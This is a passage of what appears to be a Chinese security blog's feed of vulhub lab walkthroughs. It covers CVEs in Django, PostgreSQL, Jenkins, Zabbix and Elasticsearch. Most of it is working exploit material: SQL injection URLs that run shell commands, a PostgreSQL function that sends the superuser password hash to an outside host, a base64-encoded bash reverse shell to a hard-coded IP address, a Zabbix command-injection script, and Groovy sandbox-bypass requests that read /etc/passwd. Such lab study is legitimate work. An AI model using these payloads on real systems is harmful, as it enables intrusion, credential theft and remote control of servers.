class="hljs-number">27</span>%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>%<span class="hljs-number">3</span>d1%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>bcreate%<span class="hljs-number">20</span>table%<span class="hljs-number">20</span>cmd_exec(cmd_output%<span class="hljs-number">20</span>text)--%<span class="hljs-number">20</span><br><br><br><span class="hljs-attribute">http</span>://your-ip:<span class="hljs-number">8000</span>/admin/vuln/collection/?detail__title%<span class="hljs-number">27</span>)%<span class="hljs-number">3</span>d%<span class="hljs-number">271</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>%<span class="hljs-number">3</span>d1%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>bcopy%<span class="hljs-number">20</span>cmd_exec%<span class="hljs-number">20</span>FROM%<span class="hljs-number">20</span>PROGRAM%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>ping%<span class="hljs-number">20</span>f4dt34.dnslog.cn%<span class="hljs-number">27</span>--%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>在dnslog界面发现ping命令成功执行</p><h2 id="Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）"><a href="#Django-QuerySet-order-by-SQL注入漏洞（CVE-2021-35042）" class="headerlink" title="Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）"></a>Django QuerySet.order_by() SQL注入漏洞（CVE-2021-35042）</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>QuerySet底下的order_by函数中存在的SQL注入漏洞</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Django 3.2<br>Django 3.1</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动docker环境，访问<a href="http://your-ip:8000/vuln%E5%87%BA%E7%8E%B0%E4%B8%8B%E9%9D%A2%E7%9A%84%E7%95%8C%E9%9D%A2%E5%8D%B3%E8%A1%A8%E7%A4%BA%E6%90%AD%E5%BB%BA%E6%88%90%E5%8A%9F">http://your-ip:8000/vuln出现下面的界面即表示搭建成功</a><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/django-4.png"><br>访问<a href="http://your-ip:8000/vuln/?order=-id">http://your-ip:8000/vuln/?order=-id</a> 发现结果按id逆序排序<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/django-5.png"><br>order处存在SQL注入，构造堆叠注入，报错注入<br><a href="http://your-ip:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@version)),1)%23">http://your-ip:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@version)),1)%23</a><br>其中vuln_collection是vuln应用下的模型Collection<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/django-6.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PostgreSQL 漏洞学习</title>
    <link href="/cllafrcos000hfout391v5z1u/"/>
    <url>/cllafrcos000hfout391v5z1u/</url>
    
    <content type="html"><![CDATA[<h1 id="PostgreSQL-漏洞学习"><a href="#PostgreSQL-漏洞学习" class="headerlink" title="PostgreSQL 漏洞学习"></a>PostgreSQL 漏洞学习</h1><h2 id="PostgreSQL-提权漏洞（CVE-2018-1058）"><a href="#PostgreSQL-提权漏洞（CVE-2018-1058）" class="headerlink" title="PostgreSQL 提权漏洞（CVE-2018-1058）"></a>PostgreSQL 提权漏洞（CVE-2018-1058）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>PostgreSQL7.3版本之后，默认情况下，当一个用户创建一个数据库时，PostgreSQL会创建一个叫做public的模式。默认情况下，所有的对象都会被创建到这个模式下。所以SELECT * FROM a; 就等价于 SELECT * FROM public.a;<br>如果不更改配置信息，任何用户都可以在public模式下创建对象。名字相同的对象可以在相同数据库的不同模式下存在。如果出现这种情况，而且没有指定特定的模式和对象（例如schema.object），那么PostgreSQL会基于search_path的设置来决定那个对象会被使用。<br>在该情况下，一个恶意用户可能会植入一个函数，它的功能是当被超级用户执行时，将更大的权限赋给这个恶意用户</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>9.3到10</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动docker环境，使用vulhub,vulhub的账号密码进行登录（低权限）<br>登录后执行下列命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> public.array_to_string(anyarray,text) <span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span> $$<br>    <span class="hljs-keyword">select</span> dblink_connect((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hostaddr=your-ip port=your-port user=postgres password=chybeta sslmode=disable dbname=&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">SELECT</span> passwd <span class="hljs-keyword">FROM</span> pg_shadow <span class="hljs-keyword">WHERE</span> usename<span class="hljs-operator">=</span><span class="hljs-string">&#x27;postgres&#x27;</span>)));<br>    <span class="hljs-keyword">SELECT</span> pg_catalog.array_to_string($<span class="hljs-number">1</span>,$<span class="hljs-number">2</span>);<br>$$ <span class="hljs-keyword">LANGUAGE</span> <span class="hljs-keyword">SQL</span> VOLATILE;<br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/postgresql-1.png"><br>此时，“后门”已经创建好，只要postgres的超级管理员登录执行 pg_dump 命令即可<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/postgresql-3.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/postgresql-2.png"><br>获得了md5加密的管理员密码</p><h2 id="PostgreSQL-高权限命令执行漏洞（CVE-2019-9193）"><a href="#PostgreSQL-高权限命令执行漏洞（CVE-2019-9193）" class="headerlink" title="PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）"></a>PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO&#x2F;FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令</p><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p>9.3到11</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动docker环境<br>此漏洞需要高权限账号，此处使用postgres&#x2F;postgresql<br>使用psql连接postgresql后执行下面的命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> cmd_exec;<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> cmd_exec(cmd_output text);<br><span class="hljs-keyword">COPY</span> cmd_exec <span class="hljs-keyword">FROM</span> PROGRAM <span class="hljs-string">&#x27;id&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> cmd_exec;<br></code></pre></td></tr></table></figure><p>此处命令执行的回显方式很特别，是将命令执行的结果写进一个表里，然后通过查询这个表来读取回显</p><p>反弹shell需要base64编码，反弹shell命令如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuMTM2LjEyNS8xMjM0IDA+JjE=&quot;<span class="hljs-operator">|</span>base64 <span class="hljs-operator">-</span>d<span class="hljs-operator">|</span>bash<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jenkins 漏洞学习</title>
    <link href="/cllafrcop000cfout6h5v5w1g/"/>
    <url>/cllafrcop000cfout6h5v5w1g/</url>
    
    <content type="html"><![CDATA[<h1 id="jenkins-漏洞学习"><a href="#jenkins-漏洞学习" class="headerlink" title="jenkins 漏洞学习"></a>jenkins 漏洞学习</h1><h2 id="Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）"><a href="#Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）" class="headerlink" title="Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）"></a>Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>该漏洞存在于使用HTTP协议的双向通信通道的具体实现代码中，Jenkins利用此通道来接收命令，恶意攻击者可以构造恶意攻击参数远程执行命令，从而获取系统权限，造成数据泄露</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>此漏洞主要利用两个工具复现：<a href="https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar">CVE-2017-1000353-1.1-SNAPSHOT-all.jar</a>和Python的<a href="https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py">exploit.py</a><br>使用CVE-2017-1000353-1.1-SNAPSHOT-all.jar生成ser文件<br><code>java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar pocs.ser &quot;touch /tmp/qqw&quot; </code><br>使用exploit.py 发送此文件到目标站点<br><code>python exploit.py http://your-ip:8080 pocs.ser </code><br>查看服务器文件系统发现文件已经成功创建<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/jenkins.png"></p><h2 id="Jenkins远程命令执行漏洞（CVE-2018-1000861）"><a href="#Jenkins远程命令执行漏洞（CVE-2018-1000861）" class="headerlink" title="Jenkins远程命令执行漏洞（CVE-2018-1000861）"></a>Jenkins远程命令执行漏洞（CVE-2018-1000861）</h2><h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。<br>通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>简单检测：执行下面URL可在tmp目录下创建test文件，证明命令执行成功<br>&#96;<a href="http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public%20class%20x%20%7Bpublic%20x()">http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20{public%20x()</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>zabbix 漏洞学习</title>
    <link href="/cllafrcos000ifoutcsrebin3/"/>
    <url>/cllafrcos000ifoutcsrebin3/</url>
    
    <content type="html"><![CDATA[<h1 id="zabbix-漏洞学习"><a href="#zabbix-漏洞学习" class="headerlink" title="zabbix 漏洞学习"></a>zabbix 漏洞学习</h1><h2 id="zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）"><a href="#zabbix-latest-php-SQL注入漏洞（CVE-2016-10134）" class="headerlink" title="zabbix latest.php SQL注入漏洞（CVE-2016-10134）"></a>zabbix latest.php SQL注入漏洞（CVE-2016-10134）</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>zabbix 2.2.x 3.0.0-3.0.3</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>此漏洞的利用主要有两个php文件</p><ol><li>latest.php<br>通过此php文件进行sql注入漏洞利用需要先登录，此处采用guest登录（默认空密码）<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-1.png"><br>此时可以发现数据包中有zbx_sessionid字段，将此字段的后16位值复制到下面url的sid后，访问<br><code>http://your-ip:8080/latest.php?output=ajax&amp;sid=055e1ffa36164a58&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0) </code><br>其中toggle_ids[]即为注入点，由于group_concat有长度限制，此处数据库内的表名过多，group_concat会被截断<br>可以采用sqlmap进行注入，不过使用sqlmap进行注入时要注意，要使用-r参数指定数据包文件进行注入，使用-u参数注入上面的url是没有结果的，因为需要数据包内的session。</li><li>jsrpc.php<br>通过此文件触发SQL注入漏洞的情况下无需登录，直接访问下面的地址即可<br><code>http://your-ip:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0) </code><br>其中，profileIdx2为注入字段</li></ol><h3 id="深层利用"><a href="#深层利用" class="headerlink" title="深层利用"></a>深层利用</h3><p>通过上述SQL注入可以得到admin的账户密码，可以通过admin身份进行getshell<br>登录后进入administrator的scripts，创建一个scripts，并在其中写入想要执行的命令<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-2.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-3.png"><br>之后进入monitoring的latestdata界面，或直接访问your-ip:8080&#x2F;latest.php?ddrest&#x3D;1<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-4.png"><br>点击select，全选，点击刚刚创建的脚本名称即可执行命令<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-5.png"></p><h2 id="Zabbix-Server-trapper命令注入漏洞（CVE-2020-11800）"><a href="#Zabbix-Server-trapper命令注入漏洞（CVE-2020-11800）" class="headerlink" title="Zabbix Server trapper命令注入漏洞（CVE-2020-11800）"></a>Zabbix Server trapper命令注入漏洞（CVE-2020-11800）</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>使用admin登录，开启自动注册（开启方法如下）<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-6.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-7.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-8.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-9.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-10.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-11.png"><br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/zabbix-12.png"><br>创建成功，利用代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">ip, data</span>):<br>    conn = socket.create_connection((ip, <span class="hljs-number">10051</span>), <span class="hljs-number">10</span>)<br>    conn.send(json.dumps(data).encode())<br>    data = conn.recv(<span class="hljs-number">2048</span>)<br>    conn.close()<br>    <span class="hljs-keyword">return</span> data<br>target = sys.argv[<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(send(target,<br>&#123;<br>    <span class="hljs-string">&quot;request&quot;</span>: <span class="hljs-string">&quot;active checks&quot;</span>,<br>    <span class="hljs-string">&quot;host&quot;</span>: <span class="hljs-string">&quot;vulhub&quot;</span>,<br>    <span class="hljs-string">&quot;ip&quot;</span>: <span class="hljs-string">&quot;ffff:::;touch /tmp/success2&quot;</span><br>&#125;))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>, <span class="hljs-number">10500</span>):<br>    data = send(target,<br>    &#123;<br>        <span class="hljs-string">&quot;request&quot;</span>: <span class="hljs-string">&quot;command&quot;</span>,<br>        <span class="hljs-string">&quot;scriptid&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;hostid&quot;</span>: <span class="hljs-built_in">str</span>(i)<br>    &#125;)<br><span class="hljs-keyword">if</span> data <span class="hljs-keyword">and</span> b <span class="hljs-string">&#x27;failed&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hostid: %d&#x27;</span> % i)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>elasticsearch 漏洞学习</title>
    <link href="/cllafrcoq000efoutfqrefvuc/"/>
    <url>/cllafrcoq000efoutfqrefvuc/</url>
    
    <content type="html"><![CDATA[<h1 id="elasticsearch-漏洞学习"><a href="#elasticsearch-漏洞学习" class="headerlink" title="elasticsearch 漏洞学习"></a>elasticsearch 漏洞学习</h1><h2 id="ElasticSearch命令执行漏洞-CVE-2014-3120"><a href="#ElasticSearch命令执行漏洞-CVE-2014-3120" class="headerlink" title="ElasticSearch命令执行漏洞(CVE-2014-3120)"></a>ElasticSearch命令执行漏洞(CVE-2014-3120)</h2><h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>v1.1.1</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>此漏洞的利用需要数据库中有数据，先用post方法创建一条数据<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/es-1.png"><br>之后再向&#x2F;_search?pretty发送下面的payload即可执行任意代码<br><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/es-2.png"></p><h2 id="ElasticSearch-Groovy-沙盒绕过-代码执行漏洞（CVE-2015-1427）"><a href="#ElasticSearch-Groovy-沙盒绕过-代码执行漏洞（CVE-2015-1427）" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。</p><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p> v1.4.2<br> v1.4: 1.4.2 , 1.4.1 , 1.4.0 , 1.4.0.Beta1<br>v1.3: 1.3.7 , 1.3.6 , 1.3.5 , 1.3.4 , 1.3.3 , 1.3.2 , 1.3.1 , 1.3.0. 3</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>此漏洞是针对于上一个漏洞的修复的。上一个版本的修复，es数据库将默认动态脚本语言换成了Groovy，并且增加了沙盒。绕过此修复的方法主要有两种，一是利用Java反射机制绕过沙盒，二是利用此修复措施针对Groovy语言没有沙盒的特性</p><ol><li><p>Java反射机制绕过沙盒<br>此漏洞的利用仍是要在数据库中有数据的基础才可以执行，所以要先向es数据库中添加一条数据，具体方法见CVE-2014-3120<br>添加数据后发送下面的数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_search?pretty</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:9200<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>410<br><br><span class="language-swift"></span><br><span class="language-swift">&#123;<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;script_fields&quot;</span>: &#123;<span class="hljs-string">&quot;test#&quot;</span>: &#123;<span class="hljs-string">&quot;script&quot;</span>:<span class="hljs-string">&quot;java.lang.Math.class.forName(<span class="hljs-subst">\&quot;</span>java.io.BufferedReader<span class="hljs-subst">\&quot;</span>).getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(<span class="hljs-subst">\&quot;</span>java.io.InputStreamReader<span class="hljs-subst">\&quot;</span>).getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(<span class="hljs-subst">\&quot;</span>java.lang.Runtime<span class="hljs-subst">\&quot;</span>).getRuntime().exec(<span class="hljs-subst">\&quot;</span>cat /etc/passwd<span class="hljs-subst">\&quot;</span>).getInputStream())).readLines()&quot;</span>,<span class="hljs-string">&quot;lang&quot;</span>: <span class="hljs-string">&quot;groovy&quot;</span>&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/es-3.png"></p></li><li><p>Groovy代码执行<br>此漏洞的利用仍是要在数据库中有数据的基础才可以执行，所以要先向es数据库中添加一条数据，具体方法见CVE-2014-3120<br>添加数据后发送下面的数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_search?pretty</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:9200 <br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/* <br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en <br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) <br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close <br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/text <br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>156<br><br><span class="language-swift">&#123;<span class="hljs-string">&quot;size&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;script_fields&quot;</span>: &#123;<span class="hljs-string">&quot;lupin&quot;</span>:&#123;<span class="hljs-string">&quot;lang&quot;</span>:<span class="hljs-string">&quot;groovy&quot;</span>,<span class="hljs-string">&quot;script&quot;</span>: <span class="hljs-string">&quot;java.lang.Math.class.forName(<span class="hljs-subst">\&quot;</span>java.lang.Runtime<span class="hljs-subst">\&quot;</span>).getRuntime().exec(<span class="hljs-subst">\&quot;</span>id<span class="hljs-subst">\&quot;</span>).getText()&quot;</span>&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://bigcircle-sec.oss-cn-beijing.aliyuncs.com/es-4.png"></p></li></ol><h2 id="ElasticSearch-目录穿越漏洞（CVE-2015-5531）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-5531）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-5531）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>elasticsearch 中 备份的快照保存在备份仓库中的命名格式是以snapshot-xxx的格式<br>所以snapshot-backdata 会被误以为是test仓库的backdata快照，快照都是文件形式保存的，而snapshot-backdata是目录，elasticsearch 没有区分，如果elasticsearch发现其是目录之后，就继续读取目录下的内容，如果目录下的文件明称是恶意构造的(类似..&#x2F;..&#x2F;..&#x2F;) elasticsearch就会去读取这个递归读取文件的内容（这里elasticsearch没有过滤..），从而导致目录遍历（任意文件内容读取）</p><h3 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h3><p>&lt;1.6.1<br>elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在path.repo，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先要创建一个仓库，创建仓库可以使用下面的数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_snapshot/test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:9200<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>108<br><br><span class="language-json"></span><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;fs&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">     <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span></span><br><span class="language-json">           <span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">               <span class="hljs-attr">&quot;location&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/usr/share/elasticsearch/repo/test&quot;</span></span><br><span class="language-json">           <span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>之后要创建一个快照，使用下面的数据包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_snapshot/test2</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:9200<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>108<br><br><span class="language-json"></span><br><span class="language-json"></span><br><span class="language-json"></span><br><span class="language-json"><span 